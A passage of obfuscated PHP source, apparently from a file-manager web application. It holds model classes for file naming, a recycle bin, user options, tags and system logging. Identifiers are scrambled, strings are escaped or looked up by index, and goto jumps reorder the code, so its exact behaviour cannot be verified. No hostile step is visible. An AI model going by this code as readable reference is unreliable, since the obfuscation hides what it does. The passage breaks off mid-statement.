fileTypeProfile($ë™ğ¾Ä, $œú¨¾ù) { $ìöÁÑÖø =& $_SERVER[ú÷îèÆÜ]; $ÄŠõø‡ = $ìöÁÑÖø[2194] . $ë™ğ¾Ä . $ìöÁÑÖø[21] . $œú¨¾ù; $İ½ß¬£µ = Cache::get($ÄŠõø‡); if ($İ½ß¬£µ) { return $İ½ß¬£µ; } $Äç¾äğÅ = array($ìöÁÑÖø[623] => 0); if ($ë™ğ¾Ä != !1) { $Äç¾äğÅ[$ìöÁÑÖø[547]] = $ë™ğ¾Ä; $Äç¾äğÅ[$ìöÁÑÖø[188]] = $œú¨¾ù; } $ŒŒ›§·« = array(); $ŒŒ›§·«[$ìöÁÑÖø[2195]] = array($ìöÁÑÖø[2196] => LNG($ìöÁÑÖø[2195]), $ìöÁÑÖø[2197] => $this->where($Äç¾äğÅ)->count(), $ìöÁÑÖø[594] => $this->where($Äç¾äğÅ)->sum($ìöÁÑÖø[86])); $Á‰ªÅ¹± = KodIO::fileTypeList(); foreach ($Á‰ªÅ¹± as $áê½Ø«÷ => $€°üü³) { $Äç¾äğÅ[$ìöÁÑÖø[463]] = $this->fileTypeWhere($áê½Ø«÷); $ŒŒ›§·«[$áê½Ø«÷] = array($ìöÁÑÖø[2196] => $€°üü³[$ìöÁÑÖø[42]], $ìöÁÑÖø[2197] => $this->where($Äç¾äğÅ)->count(), $ìöÁÑÖø[594] => $this->where($Äç¾äğÅ)->sum($ìöÁÑÖø[86])); } Cache::set($ÄŠõø‡, $ŒŒ›§·«, 1200); return $ŒŒ›§·«; } public function fileNameExist($¤“ÜãÄü, $å‹‰ş²ş) { $ÑÛ«èû =& $_SERVER[ú÷îèÆÜ]; $­ıä¸— = $this->field($ÑÛ«èû[2198])->where(array($ÑÛ«èû[190] => $¤“ÜãÄü, $ÑÛ«èû[42] => $å‹‰ş²ş, $ÑÛ«èû[482] => 0))->find(); return is_array($­ıä¸—) ? $­ıä¸—[$ÑÛ«èû[191]] : !1; } public function childList($”¼ù¬) { $á—Òô =& $_SERVER[ú÷îèÆÜ]; $éÁâ¿ò– = $á—Òô[2171] . $”¼ù¬; if (isset(self::$cacheChildList[$éÁâ¿ò–])) { return self::$cacheChildList[$éÁâ¿ò–]; } $áâ¾˜‰‡ = array($á—Òô[190] => intval($”¼ù¬), $á—Òô[482] => 0); $›ÒÈèí = $this->where($áâ¾˜‰‡)->select(); $›ÒÈèí = $›ÒÈèí ? $›ÒÈèí : array(); self::$cacheChildList[$éÁâ¿ò–] = $›ÒÈèí; foreach ($›ÒÈèí as $ş÷°¸³§) { $éÁâ¿ò– = $á—Òô[510] . $ş÷°¸³§[$á—Òô[191]]; self::$cacheSourceInfo[$éÁâ¿ò–] = $ş÷°¸³§; } return $›ÒÈèí; } public function fileNameAuto($ÒŞÎå¸, $­ãÑ±ĞŠ, $šÀ£°Äö = REPEAT_RENAME, $ğêô¨Ê¤ = false) { $ü—‘„óæ =& $_SERVER[ú÷îèÆÜ]; $¦°ÑƒñÇ = get_path_ext($­ãÑ±ĞŠ); $­åéÁ­È = $¦°ÑƒñÇ ? basename($­ãÑ±ĞŠ, $ü—‘„óæ[20] . $¦°ÑƒñÇ) . $ü—‘„óæ[2199] . $¦°ÑƒñÇ : $­ãÑ±ĞŠ . $ü—‘„óæ[437]; $¬§ÖÏÂ = array($ü—‘„óæ[190] => $ÒŞÎå¸, $ü—‘„óæ[482] => 0, $ü—‘„óæ[42] => array($ü—‘„óæ[436], $­åéÁ­È)); $€öó×Ö = $this->field($ü—‘„óæ[42])->where($¬§ÖÏÂ)->select(); $¦Ğş¥ = array_to_keyvalue($€öó×Ö, $ü—‘„óæ[22], $ü—‘„óæ[42]); return $this->fileNameAutoGet($¦Ğş¥, $­ãÑ±ĞŠ, $šÀ£°Äö, $ğêô¨Ê¤); } public function fileNameAutoGet($“©§¯ÇÁ, $ŠëªŒä¿, $äõˆü×Ù, $é¨ôÅÍ) { $µ‡ë¼ =& $_SERVER[ú÷îèÆÜ]; if ($äõˆü×Ù == REPEAT_REPLACE || !$“©§¯ÇÁ || !in_array_not_case($ŠëªŒä¿, $“©§¯ÇÁ) || $é¨ôÅÍ && $äõˆü×Ù != REPEAT_RENAME_FOLDER) { return $ŠëªŒä¿; } if ($äõˆü×Ù == REPEAT_SKIP) { return !1; } $‡­Ñ—Ô½ = $µ‡ë¼[20] . get_path_ext($ŠëªŒä¿); $‡­Ñ—Ô½ = $‡­Ñ—Ô½ == $µ‡ë¼[20] || $é¨ôÅÍ ? $µ‡ë¼[22] : $‡­Ñ—Ô½; for ($¬†êèÛ¬ = 1; $¬†êèÛ¬ <= count($“©§¯ÇÁ) + 1; $¬†êèÛ¬++) { $³Ó¿ñ¦® = substr($ŠëªŒä¿, 0, strlen($ŠëªŒä¿) - strlen($‡­Ñ—Ô½)); $œØ¢‡±„ = $³Ó¿ñ¦® . "\x28{$¬†êèÛ¬}\x29{$‡­Ñ—Ô½}"; if (!in_array_not_case($œØ¢‡±„, $“©§¯ÇÁ)) { return $œØ¢‡±„; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\143\145\137\162\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\151\155\145", "\164\x69\x6d\x65", "\151\156\x73\145\162\164", "\x66\x75\156\143\x74\x69\x6f\156")); public function listData($É§©ÏòÌ = false) { $¡’åØ =& $_SERVER[ú÷îèÆÜ]; $É§©ÏòÌ = $É§©ÏòÌ ? $É§©ÏòÌ : USER_ID; $¨³‰†Æ— = $this->where(array($¡’åØ[1676] => $É§©ÏòÌ))->select(); return array_to_keyvalue($¨³‰†Æ—, $¡’åØ[22], $¡’åØ[191]); } public function moveToRecycle($‚ƒ–¹ÃÖ) { $ãıù­Í =& $_SERVER[ú÷îèÆÜ]; $»Ä“Õù˜ = Model($ãıù­Í[1373]); $–ªˆ¿Öé = $»Ä“Õù˜->sourceInfo($‚ƒ–¹ÃÖ); if (!$–ªˆ¿Öé || $–ªˆ¿Öé[$ãıù­Í[482]] == $ãıù­Í[98]) { return; } $„«ø™¤§ = array($ãıù­Í[468] => $‚ƒ–¹ÃÖ, $ãıù­Í[1676] => USER_ID, $ãıù­Í[625] => $–ªˆ¿Öé[$ãıù­Í[188]], $ãıù­Í[626] => $–ªˆ¿Öé[$ãıù­Í[547]], $ãıù­Í[629] => $–ªˆ¿Öé[$ãıù­Í[562]]); $this->add($„«ø™¤§); $this->recycleMove($‚ƒ–¹ÃÖ, 1); if ($–ªˆ¿Öé[$ãıù­Í[462]] == $ãıù­Í[98]) { $‚úÎÑÀø = array($ãıù­Í[629] => array($ãıù­Í[589], $–ªˆ¿Öé[$ãıù­Í[562]] . $‚ƒ–¹ÃÖ . $ãıù­Í[590])); $»Ä“Õù˜->where($‚úÎÑÀø)->setField($ãıù­Í[482], 1); } } public function clear() { $this->remove(!1); } public function remove($˜´¨É©½ = false, $°ÍÃßí = false) { $—çŠ¤¯ =& $_SERVER[ú÷îèÆÜ]; $°ÍÃßí = $°ÍÃßí ? $°ÍÃßí : USER_ID; $áÕéÇµ° = Model($—çŠ¤¯[1373]); $èªÂÏ¢ = $this->listData($°ÍÃßí); $˜´¨É©½ = $˜´¨É©½ === !1 ? !1 : $˜´¨É©½; $ĞÚˆã°© = array(); foreach ($èªÂÏ¢ as $ªííñü) { if ($˜´¨É©½ != !1 && !in_array($ªííñü, $˜´¨É©½)) { continue; } $Áõ¥Ûê = $áÕéÇµ°->sourceInfo($ªííñü); $áÕéÇµ°->remove($ªííñü, !1); $ÂÓ·æãÙ = $Áõ¥Ûê[$—çŠ¤¯[188]] . $—çŠ¤¯[21] . $Áõ¥Ûê[$—çŠ¤¯[547]]; $ĞÚˆã°©[$ÂÓ·æãÙ] = array($—çŠ¤¯[625] => $Áõ¥Ûê[$—çŠ¤¯[188]], $—çŠ¤¯[547] => $Áõ¥Ûê[$—çŠ¤¯[547]]); $this->where(array($—çŠ¤¯[191] => $ªííñü))->delete(); } foreach ($ĞÚˆã°© as $â°àÀÂ) { $áÕéÇµ°->targetSpaceUpdate($â°àÀÂ[$—çŠ¤¯[188]], $â°àÀÂ[$—çŠ¤¯[547]]); } } public function restore($œ—ìªÕï = false) { $×–ì„ğ° = $this->listData(); $this->_restoreSource($×–ì„ğ°, $œ—ìªÕï); } public function removeUserAll($«âóÏ³€) { $this->remove(!1, $«âóÏ³€); } public function restoreItem($ËÂìÜ×) { $this->_restoreSource(array($ËÂìÜ×), array($ËÂìÜ×)); } private function _restoreSource($İ¬ó¢˜, $×…Ğ¦à) { $Éû²×ì¿ =& $_SERVER[ú÷îèÆÜ]; $²Ğ¢˜öå = Model($Éû²×ì¿[1373]); $×…Ğ¦à = $×…Ğ¦à == !1 ? !1 : $×…Ğ¦à; if (!$İ¬ó¢˜) { return !0; } $ÂïÒÊŸí = array(); foreach ($İ¬ó¢˜ as $‹Í×›ŞÁ) { if ($×…Ğ¦à != !1 && !in_array($‹Í×›ŞÁ, $×…Ğ¦à)) { continue; } $°•úÕİ¢ = $²Ğ¢˜öå->sourceInfo($‹Í×›ŞÁ); $ ğ®ˆ í = $²Ğ¢˜öå->sourceInfo($°•úÕİ¢[$Éû²×ì¿[190]]); if ($ ğ®ˆ í[$Éû²×ì¿[482]] == $Éû²×ì¿[98]) { continue; } $²Ğ¢˜öå->lockMoveStart($‹Í×›ŞÁ); $this->recycleMove($‹Í×›ŞÁ, 0); if ($°•úÕİ¢[$Éû²×ì¿[462]] == $Éû²×ì¿[98]) { $œ¢¸ßÛ² = array($Éû²×ì¿[629] => array($Éû²×ì¿[589], $°•úÕİ¢[$Éû²×ì¿[562]] . $‹Í×›ŞÁ . $Éû²×ì¿[590])); $²Ğ¢˜öå->where($œ¢¸ßÛ²)->setField($Éû²×ì¿[482], 0); $this->restoreFolderChildren($‹Í×›ŞÁ, $İ¬ó¢˜); } $this->where(array($Éû²×ì¿[191] => $‹Í×›ŞÁ))->delete(); $²Ğ¢˜öå->folderSizeReset($°•úÕİ¢[$Éû²×ì¿[190]]); $ÂïÒÊŸí[] = $°•úÕİ¢[$Éû²×ì¿[190]]; if ($°•úÕİ¢[$Éû²×ì¿[462]] == $Éû²×ì¿[98]) { $ÂïÒÊŸí[] = $‹Í×›ŞÁ; } $²Ğ¢˜öå->lockMoveEnd($‹Í×›ŞÁ); } $²Ğ¢˜öå->updateModifyTime($ÂïÒÊŸí); } private function restoreFolderChildren($¤²åø, $ƒÃŞŒ™›) { $–¡Ìë÷‡ =& $_SERVER[ú÷îèÆÜ]; $Ù™Çìô« = Model($–¡Ìë÷‡[1373]); $ÚËïĞ¾“ = array($–¡Ìë÷‡[191] => array($–¡Ìë÷‡[17], array())); foreach ($ƒÃŞŒ™› as $£ã¾Ò²) { if ($£ã¾Ò² == $¤²åø) { continue; } if (!$Ù™Çìô«->isParentOf($¤²åø, $£ã¾Ò²)) { continue; } $¹Á·õÃ¤ = $Ù™Çìô«->sourceInfo($£ã¾Ò²); if ($¹Á·õÃ¤[$–¡Ìë÷‡[462]] == $–¡Ìë÷‡[98]) { $ÚËïĞ¾“[] = array($–¡Ìë÷‡[629] => array($–¡Ìë÷‡[589], $¹Á·õÃ¤[$–¡Ìë÷‡[562]] . $£ã¾Ò² . $–¡Ìë÷‡[590])); } else { $ÚËïĞ¾“[$–¡Ìë÷‡[191]][1][] = $£ã¾Ò²; } } if (!$ÚËïĞ¾“[$–¡Ìë÷‡[191]][1]) { unset($ÚËïĞ¾“[$–¡Ìë÷‡[191]]); } if (!$ÚËïĞ¾“) { return; } if (is_array($ÚËïĞ¾“[$–¡Ìë÷‡[191]]) && is_array($ÚËïĞ¾“[$–¡Ìë÷‡[191]][1])) { $ÚËïĞ¾“[$–¡Ìë÷‡[191]][1] = array_unique($ÚËïĞ¾“[$–¡Ìë÷‡[191]][1]); } $ÚËïĞ¾“[$–¡Ìë÷‡[1041]] = $–¡Ìë÷‡[1981]; $Ù™Çìô«->where($ÚËïĞ¾“)->setField($–¡Ìë÷‡[482], 1); } private function recycleMove($î“¦Îëî, $ØìúŠü = 1) { $ñ‹Â‰Ä =& $_SERVER[ú÷îèÆÜ]; $ùÂüåáà = Model($ñ‹Â‰Ä[1373]); $–§Ë™ä§ = Model($ñ‹Â‰Ä[2200]); $¢ªÎù€Ñ = array($ñ‹Â‰Ä[191] => $î“¦Îëî); if ($ØìúŠü) { $ùÂüåáà->where($¢ªÎù€Ñ)->setField($ñ‹Â‰Ä[482], 1); $–§Ë™ä§->eventRecycle($î“¦Îëî, $ñ‹Â‰Ä[2201]); } else { $’‰½Ã¦ë = $ùÂüåáà->where($¢ªÎù€Ñ)->find(); $Ğ¾“æğ¨ = $’‰½Ã¦ë[$ñ‹Â‰Ä[462]] == $ñ‹Â‰Ä[98]; $ÉõÙóÜ… = $ùÂüåáà->fileNameAuto($’‰½Ã¦ë[$ñ‹Â‰Ä[190]], $’‰½Ã¦ë[$ñ‹Â‰Ä[42]], REPEAT_RENAME_FOLDER, $Ğ¾“æğ¨); if ($ÉõÙóÜ… != $’‰½Ã¦ë[$ñ‹Â‰Ä[42]]) { $ùÂüåáà->rename($î“¦Îëî, $ÉõÙóÜ…); } $ùÂüåáà->where($¢ªÎù€Ñ)->setField($ñ‹Â‰Ä[482], 0); $–§Ë™ä§->eventRecycle($î“¦Îëî, $ñ‹Â‰Ä[2202]); } } } goto DÔáô¬¤„Ë; d¶‘µ÷Ó¿†: define($_SERVER[ú÷îèÆÜ][293], 3); define($_SERVER[ú÷îèÆÜ][294], 1); define($_SERVER[ú÷îèÆÜ][295], 0); goto Bš ±«ÃØ­; eÍìÖäÑŠ»: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‡È›Éá÷) { $óÉîÚñ® =& $_SERVER[ú÷îèÆÜ]; $äÌ÷îÔ¸ = defined($óÉîÚñ®[2104]) && USER_ID ? USER_ID : $óÉîÚñ®[22]; return "\125\163\145\x72\x4f\160\164\151\157\156\x5f{$‡È›Éá÷}\137" . $äÌ÷îÔ¸; } protected function filterWhere($¡İÓæ©¼) { $œ¬İ»§º =& $_SERVER[ú÷îèÆÜ]; $¡İÓæ©¼[$œ¬İ»§º[1685]] = defined($œ¬İ»§º[2104]) && USER_ID ? USER_ID : $œ¬İ»§º[22]; return $¡İÓæ©¼; } public function cacheRemoveUser($§ Ì×”ñ, $ÙŠÓá‚â) { return Cache::remove("\125\163\x65\162\117\x70\164\x69\x6f\x6e\137{$§ Ì×”ñ}\137" . $ÙŠÓá‚â); } protected function optionDefault($Œ÷ÀÉ¼¢ = '') { $–„ÅÃº¿ =& $_SERVER[ú÷îèÆÜ]; if ($Œ÷ÀÉ¼¢ == $–„ÅÃº¿[22]) { return $GLOBALS[$–„ÅÃº¿[16]][$–„ÅÃº¿[2380]]; } if ($Œ÷ÀÉ¼¢ == $–„ÅÃº¿[2381]) { return $GLOBALS[$–„ÅÃº¿[16]][$–„ÅÃº¿[2382]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\56\164\141\147\x4c\x69\x73\x74"; public $modelType = "\x55\163\x65\x72\x4f\160\164\151\157\x6e"; public $field = array("\x6e\141\x6d\145", "\163\164\x79\154\x65", "\163\157\x72\164"); public function listData($şç­Â× = false, $©ä³Ûõ = "\163\x6f\x72\164", $ÕÛ˜”ƒã = false) { return parent::listData($şç­Â×, $©ä³Ûõ, $ÕÛ˜”ƒã); } public function remove($¨«‡–±º) { return parent::remove($¨«‡–±º); } public function add($¡Ñ»”–î, $İÄ®—ç = "\x6c\141\x62\x65\154\55\x67\x72\x65\171\x2d\156\157\x72\x6d\141\154") { $Å¯¾ïÖœ =& $_SERVER[ú÷îèÆÜ]; if ($this->findByName($¡Ñ»”–î)) { return !1; } $€“´¢şÀ = array($Å¯¾ïÖœ[471] => $¡Ñ»”–î, $Å¯¾ïÖœ[535] => $İÄ®—ç, $Å¯¾ïÖœ[1887] => $this->getSort($Å¯¾ïÖœ[311]) + 1); return parent::insert($€“´¢şÀ); } public function update($°ıÓØäÀ, $öÀÔÔÇ) { $·—£Á =& $_SERVER[ú÷îèÆÜ]; $ñ¤Î³Õ§ = $this->listData($°ıÓØäÀ); $ş„·÷ Ä = $this->findByName($öÀÔÔÇ[$·—£Á[42]]); if (!$ñ¤Î³Õ§ || $ş„·÷ Ä && $ş„·÷ Ä[$·—£Á[452]] != $ñ¤Î³Õ§[$·—£Á[452]]) { return !1; } return parent::update($°ıÓØäÀ, $öÀÔÔÇ); } public function moveTop($â Ğ·ÒÑ) { $Î¼ÓÀúÇ =& $_SERVER[ú÷îèÆÜ]; $È›È‘í” = parent::listData(); $ÆÕ®²ï = $this->getSort($Î¼ÓÀúÇ[310]); foreach ($È›È‘í” as &$×Œø‡²×) { if ($×Œø‡²×[$Î¼ÓÀúÇ[452]] == $â Ğ·ÒÑ) { $×Œø‡²×[$Î¼ÓÀúÇ[1907]] = $ÆÕ®²ï; continue; } $×Œø‡²×[$Î¼ÓÀúÇ[1907]] += 1; } unset($×Œø‡²×); return parent::resetData($È›È‘í”); } public function moveBottom($ ƒİâ‚ş) { $Şì˜Õ =& $_SERVER[ú÷îèÆÜ]; $ÎÄ™Ÿ£î = $this->getSort($Şì˜Õ[311]) + 1; return parent::update($ ƒİâ‚ş, array($Şì˜Õ[1907] => $ÎÄ™Ÿ£î)); } public function resetSort($Ñ¥é¶ĞÛ) { $´ÎÖ»´ =& $_SERVER[ú÷îèÆÜ]; $—ıä€Î = array(); $Ñ¥é¶ĞÛ = is_array($Ñ¥é¶ĞÛ) ? $Ñ¥é¶ĞÛ : array(); for ($ÙÜóœÉº = 0; $ÙÜóœÉº < count($Ñ¥é¶ĞÛ); $ÙÜóœÉº++) { $—ıä€Î[$Ñ¥é¶ĞÛ[$ÙÜóœÉº] . $´ÎÖ»´[22]] = $ÙÜóœÉº + 1; } $ëúÔèŞÜ = parent::listData(); foreach ($ëúÔèŞÜ as &$üïÁãØÓ) { $©œâÀÊ = $—ıä€Î[$üïÁãØÓ[$´ÎÖ»´[452]]]; $üïÁãØÓ[$´ÎÖ»´[1907]] = $©œâÀÊ ? $©œâÀÊ : $üïÁãØÓ[$´ÎÖ»´[1907]]; } unset($üïÁãØÓ); return parent::resetData($ëúÔèŞÜ); } private function getSort($êŠìäÒ) { $è†¦¼Î… =& $_SERVER[ú÷îèÆÜ]; $¥Ÿıû¿Ñ = parent::listData(); $óş‡œ¶Ë = array_to_keyvalue($¥Ÿıû¿Ñ, $è†¦¼Î…[22], $è†¦¼Î…[1907]); if (!$óş‡œ¶Ë) { $óş‡œ¶Ë = array(0); } $©½Òš‡£ = $êŠìäÒ == $è†¦¼Î…[311] ? max($óş‡œ¶Ë) : min($óş‡œ¶Ë); return intval($©½Òš‡£); } } goto Eùİ¢Á¯Ø‡; F–‚“Å™ç : class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\x69\x6d\x65", "\164\x69\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\165\156\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÍãŞ€ =& $_SERVER[ú÷îèÆÜ]; return array($ÍãŞ€[2219] => LNG($ÍãŞ€[2220]), $ÍãŞ€[2221] => LNG($ÍãŞ€[2222]), $ÍãŞ€[1826] => LNG($ÍãŞ€[2223]), $ÍãŞ€[2224] => LNG($ÍãŞ€[2225]), $ÍãŞ€[2226] => LNG($ÍãŞ€[2227]), $ÍãŞ€[2228] => LNG($ÍãŞ€[2229]), $ÍãŞ€[2230] => LNG($ÍãŞ€[2231]), $ÍãŞ€[1856] => LNG($ÍãŞ€[2231]), $ÍãŞ€[1857] => LNG($ÍãŞ€[2232]), $ÍãŞ€[2233] => LNG($ÍãŞ€[2234]), $ÍãŞ€[2235] => LNG($ÍãŞ€[2236]), $ÍãŞ€[2237] => LNG($ÍãŞ€[2238]), $ÍãŞ€[2239] => LNG($ÍãŞ€[2240]), $ÍãŞ€[1854] => LNG($ÍãŞ€[2241]), $ÍãŞ€[2242] => LNG($ÍãŞ€[2243]), $ÍãŞ€[1861] => LNG($ÍãŞ€[2244]), $ÍãŞ€[2245] => LNG($ÍãŞ€[2246]), $ÍãŞ€[2247] => LNG($ÍãŞ€[2248]), $ÍãŞ€[2249] => LNG($ÍãŞ€[2250]), $ÍãŞ€[2251] => LNG($ÍãŞ€[2252]), $ÍãŞ€[1864] => LNG($ÍãŞ€[2253]), $ÍãŞ€[1865] => LNG($ÍãŞ€[2254]), $ÍãŞ€[2255] => LNG($ÍãŞ€[2256]), $ÍãŞ€[2257] => LNG($ÍãŞ€[2258]), $ÍãŞ€[2259] => LNG($ÍãŞ€[2260]), $ÍãŞ€[1859] => LNG($ÍãŞ€[2261]), $ÍãŞ€[2262] => LNG($ÍãŞ€[2263]), $ÍãŞ€[1858] => LNG($ÍãŞ€[2264]), $ÍãŞ€[2265] => LNG($ÍãŞ€[2266]), $ÍãŞ€[2267] => LNG($ÍãŞ€[2268]), $ÍãŞ€[2269] => LNG($ÍãŞ€[2270]), $ÍãŞ€[2271] => LNG($ÍãŞ€[2271]), $ÍãŞ€[2272] => LNG($ÍãŞ€[1830]), $ÍãŞ€[2273] => LNG($ÍãŞ€[2274]), $ÍãŞ€[2275] => LNG($ÍãŞ€[2276]), $ÍãŞ€[2277] => LNG($ÍãŞ€[2278]), $ÍãŞ€[2279] => LNG($ÍãŞ€[2280]), $ÍãŞ€[2281] => LNG($ÍãŞ€[2282]), $ÍãŞ€[2283] => LNG($ÍãŞ€[2283]), $ÍãŞ€[2284] => LNG($ÍãŞ€[2285]), $ÍãŞ€[2286] => LNG($ÍãŞ€[2287]), $ÍãŞ€[2288] => LNG($ÍãŞ€[2289]), $ÍãŞ€[2290] => LNG($ÍãŞ€[2291]), $ÍãŞ€[2292] => LNG($ÍãŞ€[2293]), $ÍãŞ€[2294] => LNG($ÍãŞ€[2295])); } private function typeFile() { $Ç•Ì„•› =& $_SERVER[ú÷îèÆÜ]; $ğ‹…ô…´ = array($Ç•Ì„•›[1861] => array($Ç•Ì„•›[1862]), $Ç•Ì„•›[2237] => array($Ç•Ì„•›[2296]), $Ç•Ì„•›[2239] => array($Ç•Ì„•›[2297]), $Ç•Ì„•›[1854] => array($Ç•Ì„•›[1855], $Ç•Ì„•›[2298]), $Ç•Ì„•›[2247] => array(), $Ç•Ì„•›[2249] => array(), $Ç•Ì„•›[2251] => array(), $Ç•Ì„•›[1864] => array($Ç•Ì„•›[1866]), $Ç•Ì„•›[1865] => array($Ç•Ì„•›[1866]), $Ç•Ì„•›[2255] => array($Ç•Ì„•›[2299]), $Ç•Ì„•›[2257] => array($Ç•Ì„•›[2299]), $Ç•Ì„•›[2259] => array($Ç•Ì„•›[2300]), $Ç•Ì„•›[2245] => array($Ç•Ì„•›[2301]), $Ç•Ì„•›[1859] => array($Ç•Ì„•›[2302]), $Ç•Ì„•›[2262] => array($Ç•Ì„•›[2303]), $Ç•Ì„•›[1858] => array($Ç•Ì„•›[1860])); return $ğ‹…ô…´; } private function typeAll() { $ÒÒ²Öûè =& $_SERVER[ú÷îèÆÜ]; $Õõ„º–µ = $this->typeList; $èŒ…Õ€ = array_filter($this->typeFile()); foreach ($èŒ…Õ€ as $¸‡„šõ => $ÀîÓ¾— ) { $Õõ„º–µ[$ÀîÓ¾— [0]] = $Õõ„º–µ[$¸‡„šõ]; } $Õõ„º–µ[$ÒÒ²Öûè[1866]] = LNG($ÒÒ²Öûè[2304]); $Õõ„º–µ[$ÒÒ²Öûè[2299]] = LNG($ÒÒ²Öûè[2305]); return $Õõ„º–µ; } public function addLog($œÕé¾, $€ÈÁ…« = array()) { $¡éå“á— =& $_SERVER[ú÷îèÆÜ]; if (!isset($this->typeList[$œÕé¾])) { return; } $ÆÑ·Š‘ª = isset($€ÈÁ…«[$¡éå“á—[1685]]) ? $€ÈÁ…«[$¡éå“á—[1685]] : 0; if (!$ÆÑ·Š‘ª) { $ÆÑ·Š‘ª = Session::get($¡éå“á—[2020]); } if ($œÕé¾ == $¡éå“á—[2273] && is_array($€ÈÁ…«[$¡éå“á—[2306]]) && !$€ÈÁ…«[$¡éå“á—[2306]]) { return; } $ğ«Ñ­­Î = get_client_ip(); if (!$€ÈÁ…« || strlen(json_encode($€ÈÁ…«)) >= 1024) { $€ÈÁ…« = array($¡éå“á—[2307] => $ğ«Ñ­­Î); } else { if (is_array($€ÈÁ…«)) { $€ÈÁ…«[$¡éå“á—[2307]] = $ğ«Ñ­­Î; } else { $€ÈÁ…« = array($¡éå“á—[1243] => $€ÈÁ…«, $¡éå“á—[2307] => $ğ«Ñ­­Î); } } $€ÈÁ…« = array($¡éå“á—[1675] => Session::sign(), $¡éå“á—[1676] => intval($ÆÑ·Š‘ª), $¡éå“á—[43] => $œÕé¾, $¡éå“á—[1678] => json_encode($€ÈÁ…«)); parent::add($€ÈÁ…«); } public function remove($‰Ñ„Ûëš) { $this->where(array($_SERVER[ú÷îèÆÜ][470] => $‰Ñ„Ûëš))->delete(); } private function _makeOrder($„‡õå’‚ = '') { $³ûçèòù =& $_SERVER[ú÷îèÆÜ]; $Ğ §ÛèÙ = $³ûçèòù[225]; $‘Æœİ® = array($³ûçèòù[500] => $³ûçèòù[501], $³ûçèòù[502] => $³ûçèòù[503]); $±†—ÇÖ = Input::get($³ûçèòù[508], $³ûçèòù[17], $³ûçèòù[2056], array($³ûçèòù[1974], $³ûçèòù[502])); $±†—ÇÖ = $‘Æœİ®[$±†—ÇÖ]; $„‡õå’‚ = $„‡õå’‚ . "{$Ğ §ÛèÙ}\x20{$±†—ÇÖ}"; return $this->order($„‡õå’‚); } public function get($ëüÃ = '') { $ä—‡Í–Û =& $_SERVER[ú÷îèÆÜ]; if (!$ëüÃ) { show_json(array()); } $„ğ­ó€á = array(); if ($ëüÃ[$ä—‡Í–Û[1685]]) { $„ğ­ó€á[$ä—‡Í–Û[1685]] = $ëüÃ[$ä—‡Í–Û[1685]]; } if (isset($ëüÃ[$ä—‡Í–Û[800]])) { $Ş¸ş·•¤ = $ëüÃ[$ä—‡Í–Û[800]]; $ğ£ËŞÍ = isset($ëüÃ[$ä—‡Í–Û[801]]) ? $ëüÃ[$ä—‡Í–Û[801]] : time(); $„ğ­ó€á[$ä—‡Í–Û[225]] = array($ä—‡Í–Û[386], array($Ş¸ş·•¤, $ğ£ËŞÍ)); } if ($ëüÃ[$ä—‡Í–Û[43]]) { $ûÍğôšÁ = explode($ä—‡Í–Û[60], $ëüÃ[$ä—‡Í–Û[43]]); $¢¢Óçú‚ = $this->typeFile(); $À™à¨­ò = array(); foreach ($ûÍğôšÁ as $€À¨µçú) { $À™à¨­ò[] = $€À¨µçú; if (isset($¢¢Óçú‚[$€À¨µçú])) { $À™à¨­ò = array_merge($À™à¨­ò, $¢¢Óçú‚[$€À¨µçú]); } } $À™à¨­ò = array_unique($À™à¨­ò); if ($À™à¨­ò) { $„ğ­ó€á[$ä—‡Í–Û[43]] = array($ä—‡Í–Û[17], $À™à¨­ò); } } else { $„ğ­ó€á[$ä—‡Í–Û[43]] = array($ä—‡Í–Û[2308], $ä—‡Í–Û[2309]); } if (!empty($ëüÃ[$ä—‡Í–Û[2307]])) { $„ğ­ó€á[$ä—‡Í–Û[503]] = array($ä—‡Í–Û[436], "\x25{$ëüÃ[$ä—‡Í–Û[2307]]}\x25"); } $“´ëºĞá = $this->_makeOrder()->where($„ğ­ó€á)->selectPage(); if (empty($“´ëºĞá[$ä—‡Í–Û[422]])) { show_json(array(), !0, $“´ëºĞá[$ä—‡Í–Û[419]]); } $“´ëºĞá[$ä—‡Í–Û[422]] = $this->logList($“´ëºĞá[$ä—‡Í–Û[422]]); return $“´ëºĞá; } private function ipAddress(&$äÑêÍˆÏ) { $öŸİ˜»Š =& $_SERVER[ú÷îèÆÜ]; if (!empty($äÑêÍˆÏ[$öŸİ˜»Š[2307]])) { $ÉóÖ¨²ò = IpLocation::get($äÑêÍˆÏ[$öŸİ˜»Š[2307]]); } else { $ÉóÖ¨²ò = LNG($öŸİ˜»Š[2310]); } $äÑêÍˆÏ[$öŸİ˜»Š[2311]] = $ÉóÖ¨²ò; } private function descZipDownload($±ÔËõ°û, &$Ï€¹°ßÒ) { $ÕĞ‡†Ş =& $_SERVER[ú÷îèÆÜ]; if (!isset($±ÔËõ°û[$ÕĞ‡†Ş[2312]])) { return; } $ø‹à…“ï = json_decode($±ÔËõ°û[$ÕĞ‡†Ş[2312]], !0); foreach ($ø‹à…“ï as $¿˜µƒ) { try { $¥«¼°¢Õ = IO::infoFullSimple($¿˜µƒ[$ÕĞ‡†Ş[94]]); } catch (Exception $¥İÎ©–Ì) { continue; } $±ÔËõ°û[$ÕĞ‡†Ş[94]] = $¿˜µƒ[$ÕĞ‡†Ş[94]]; $Ï€¹°ßÒ[] = $±ÔËõ°û[$ÕĞ‡†Ş[191]] = $¥«¼°¢Õ[$ÕĞ‡†Ş[191]]; $Ï€¹°ßÒ[] = $±ÔËõ°û[$ÕĞ‡†Ş[2111]] = $¥«¼°¢Õ[$ÕĞ‡†Ş[190]]; break; } return $±ÔËõ°û; } private function getSourceList(&$–Ä±†¶) { $í¯†­ÃÆ =& $_SERVER[ú÷îèÆÜ]; $¤û¯ø½ = array(); foreach ($–Ä±†¶ as $Ø‘ôÂ« => $âÇ©şá) { $®şõÊÀ› = 